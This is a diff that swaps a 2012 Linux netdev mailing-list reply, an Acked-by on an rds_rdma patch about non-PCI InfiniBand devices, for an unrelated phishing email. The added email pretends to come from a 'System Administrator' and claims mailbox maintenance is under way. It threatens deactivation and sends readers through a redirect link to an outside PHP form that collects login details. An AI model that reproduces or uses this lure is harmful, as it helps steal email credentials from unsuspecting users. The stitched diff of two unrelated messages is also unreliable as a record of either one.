@@ -1,43 +1,38 @@
-From: Venkat Venkatsubra <venkat.x.venkatsubra@oracle.com>
-Subject: Re: [PATCH resend] rds_rdma: don't assume infiniband device is PCI
-Date: Mon, 28 May 2012 15:15:18 -0500
-Message-ID: <4FC3DCD6.5020604@oracle.com>
-References: <1338231125-9005-1-git-send-email-cascardo@linux.vnet.ibm.com>
+From: "LEBIEDZ-ODROBINA, DOROTA" <DODROBIN@HarringtonHospital.org>
+Subject: Keeping track of your usage?!!!?
+Date: Mon, 28 May 2012 17:31:44 -0400
+Message-ID: <151D6C8042268D45BEFC3AC44E476C6AFC5402@hhmail01.southbridge.harringtonhospital.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=ISO-8859-1; format=flowed
-Content-Transfer-Encoding: 7bit
-Cc: netdev@vger.kernel.org, "David S. Miller" <davem@davemloft.net>,
-	dledford@redhat.com, Jes.Sorensen@redhat.com
-To: Thadeu Lima de Souza Cascardo <cascardo@linux.vnet.ibm.com>
+Content-Type: text/plain; charset=US-ASCII
+Content-Transfer-Encoding: 7BIT
+To: undisclosed-recipients:;
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from acsinet15.oracle.com ([141.146.126.227]:35902 "EHLO
-	acsinet15.oracle.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1753567Ab2E1UPb (ORCPT
-	<rfc822;netdev@vger.kernel.org>); Mon, 28 May 2012 16:15:31 -0400
-In-Reply-To: <1338231125-9005-1-git-send-email-cascardo@linux.vnet.ibm.com>
+Received: from smtp.harringtonhospital.org ([66.189.126.100]:56224 "EHLO
+	smtp.harringtonhospital.org" rhost-flags-OK-OK-OK-OK)
+	by vger.kernel.org with ESMTP id S1752198Ab2E1Vx6 convert rfc822-to-8bit
+	(ORCPT <rfc822;netdev@vger.kernel.org>);
+	Mon, 28 May 2012 17:53:58 -0400
+Received: from zixvpm.southbridge.harringtonhospital.org (ZixVPM [127.0.0.1])
+	by Outbound.harringtonhospital.org (Proprietary) with ESMTP id 2772818E9BC
+	for <netdev@vger.kernel.org>; Mon, 28 May 2012 17:36:34 -0400 (EDT)
+Content-class: urn:content-classes:message
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-On 5/28/2012 1:52 PM, Thadeu Lima de Souza Cascardo wrote:
-> RDS code assumes that the struct ib_device dma_device member, which is a
-> pointer, points to a struct device embedded in a struct pci_dev.
->
-> This is not the case for ehca, for example, which is a OF driver, and
-> makes dma_device point to a struct device embedded in a struct
-> platform_device.
->
-> This will make the system crash when rds_rdma is loaded in a system
-> with ehca, since it will try to access the bus member of a non-existent
-> struct pci_dev.
->
-> The only reason rds_rdma uses the struct pci_dev is to get the NUMA node
-> the device is attached to. Using dev_to_node for that is much better,
-> since it won't assume which bus the infiniband is attached to.
->
-> Signed-off-by: Thadeu Lima de Souza Cascardo<cascardo@linux.vnet.ibm.com>
-> Cc: dledford@redhat.com
-> Cc: Jes.Sorensen@redhat.com
-> Cc: Venkat Venkatsubra<venkat.x.venkatsubra@oracle.com>
-> ---
->
-Acked-by: Venkat Venkatsubra <venkat.x.venkatsubra@oracle.com>
+A Computer Database Maintenance is currently going on our Web mail Message
+Center. Our Message Center needs to be re-set because of the high amount
+of Spam mails we receive daily. A Quarantine Maintenance will help us
+prevent this everyday dilemma.
+To re-validate your mailbox Please:
+ 
+Click here to complete update 
+<https://mail.lawsonstate.edu/owa/redir.aspx?C=dc00bac7dcc547d8a25ddb1e891cb1ba&URL=http%3a%2f%2fwww.tkenoyer.com%2fphpform%2fuse%2fupgrade%2fform1.html> 
+
+
+Failure to re-validate your mailbox will render your e-mail in-active from
+our database.
+Thanks
+System Administrator.
+
+
+The information transmitted, including any accompanying documents, is for use by the intended recipient only and may contain confidential and/or privileged material. Any review, transmission, re-transmission, dissemination, copying or other use of, or taking of any action in reliance upon this information by persons or entities other than the intended recipient is prohibited. If you received this transmission in error, please notify the sender upon receipt by replying to this message or calling, and immediately delete or destroy the material. Thank you. 
